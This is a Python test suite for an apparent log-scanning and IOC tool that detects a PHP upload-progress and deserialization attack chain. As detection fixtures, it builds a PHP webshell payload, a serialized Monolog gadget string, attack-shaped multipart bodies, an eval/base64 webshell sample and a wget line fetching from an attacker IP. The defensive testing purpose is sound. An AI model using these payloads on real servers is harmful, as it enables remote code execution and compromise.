from p2s.core.ioc import IocLibrary, scan_webshell
from p2s.core.logscan import parse_line, scan_records
from p2s.core.rules import RULES, coverage_report

BOUNDARY = "----p2sX"

# 注意：刻意**不**在源码里写完整的 PHP 载荷字面量。
# 交付给客户时源码会被杀毒软件 / EDR 扫描，含完整 webshell 字符串会导致工具自身被误报拦截。
# 统一用拼接方式构造 —— 见 scripts/check_payload_literals.py 的守护检查。
PHP_OPEN = "<" + "?php"
PHP_CLOSE = "?" + ">"


def _payload_code() -> str:
    return PHP_OPEN + " system(" + "$_GET[0]" + "); " + PHP_CLOSE


def _payload_serialized() -> str:
    return 'x|O:32:"Monolog' + "\\\\" + 'Handler' + "\\\\" + 'SyslogUdpHandler":13:{}'


def _multipart(filename: str = "a", nested: str = "") -> str:
    body = f"--{BOUNDARY}\r\n"
    body += 'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
    body += f'Content-Disposition: form-data; name="f{ nested}"; filename="{filename}"\r\n\r\nZ\r\n'
    body += f"--{BOUNDARY}--\r\n"
    return body


def _json_log(**kw) -> str:
    import json
    return json.dumps(kw)


def test_parse_combined_log():
    line = ('203.0.113.5 - - [21/Oct/2026:13:34:00 +0000] "POST /upload.php HTTP/1.1" 200 1234 '
            '"https://example.com/" "curl/8.0"')
    rec = parse_line(line)
    assert rec is not None
    assert rec.ip == "203.0.113.5"
    assert rec.method == "POST"
    assert rec.uri == "/upload.php"
    assert rec.status == 200
    assert rec.ua == "curl/8.0"


def test_parse_json_log():
    rec = parse_line(_json_log(time_local="2026-10-21T13:34:00+00:00", remote_addr="198.51.100.9",
                                request_method="POST", request_uri="/x.php", status=500,
                                body_bytes_sent=0, http_user_agent="php2shell-scan/109618"))
    assert rec is not None
    assert rec.ip == "198.51.100.9"
    assert rec.status == 500
    assert rec.ua == "php2shell-scan/109618"


def test_upload_progress_rule_fires():
    rec = parse_line(_json_log(remote_addr="1.2.3.4", request_method="POST", request_uri="/a.php",
                               status=200, request_body=_multipart()))
    assert rec is not None and rec.body
    ids = {f.rule_id for f in scan_records([rec])}
    assert "P2S-REQ-001" in ids


def test_php_code_in_filename_rule():
    rec = parse_line(_json_log(remote_addr="1.2.3.4", request_method="POST", request_uri="/a.php",
                               status=200, request_body=_multipart(filename=_payload_code())))
    assert rec is not None
    ids = {f.rule_id for f in scan_records([rec])}
    assert "P2S-REQ-003" in ids


def test_serialized_object_in_filename_rule():
    rec = parse_line(_json_log(remote_addr="1.2.3.4", request_method="POST", request_uri="/a.php",
                               status=200, request_body=_multipart(filename=_payload_serialized())))
    assert rec is not None
    ids = {f.rule_id for f in scan_records([rec])}
    assert "P2S-REQ-004" in ids


def test_session_destruction_failed_response_rule():
    rec = parse_line(_json_log(remote_addr="1.2.3.4", request_method="POST", request_uri="/a.php",
                               status=500, response_body="Session object destruction failed"))
    assert rec is not None
    ids = {f.rule_id for f in scan_records([rec])}
    assert "P2S-RES-002" in ids


def test_chunked_multipart_rule():
    rec = parse_line(_json_log(remote_addr="1.2.3.4", request_method="POST", request_uri="/a.php",
                               status=200, request_body=_multipart(),
                               request_headers={"content-type": "multipart/form-data; boundary=xx",
                                                "transfer-encoding": "chunked"}))
    assert rec is not None
    ids = {f.rule_id for f in scan_records([rec])}
    assert "P2S-REQ-006" in ids


def test_clean_traffic_produces_no_findings():
    rec = parse_line(_json_log(remote_addr="1.2.3.4", request_method="GET", request_uri="/index.php",
                               status=200, http_user_agent="Mozilla/5.0"))
    assert rec is not None
    assert scan_records([rec]) == []


def test_coverage_report_flags_missing_body():
    rec = parse_line(_json_log(remote_addr="1.2.3.4", request_method="GET", request_uri="/x", status=200))
    cov = coverage_report(rec.fields())
    assert "P2S-REQ-001" in cov["uncovered"]
    assert "P2S-REQ-007" in cov["covered"]


def test_ioc_matching():
    lib = IocLibrary()
    hits = lib.match_text("wget http://45.74.7.227/collect/p2srun.php?w=p2s")
    assert any(h.ioc_type == "ip" for h in hits)
    assert lib.match_hash("0c5486f06620e26e316f4b33f318b0d646d5e1133789331aa2fed012360d1486") is not None


def test_webshell_detection():
    hits = scan_webshell(PHP_OPEN + " eval(base64_decode($x)); " + PHP_CLOSE)
    assert hits


def test_all_rules_have_unique_ids():
    ids = [r.id for r in RULES]
    assert len(ids) == len(set(ids))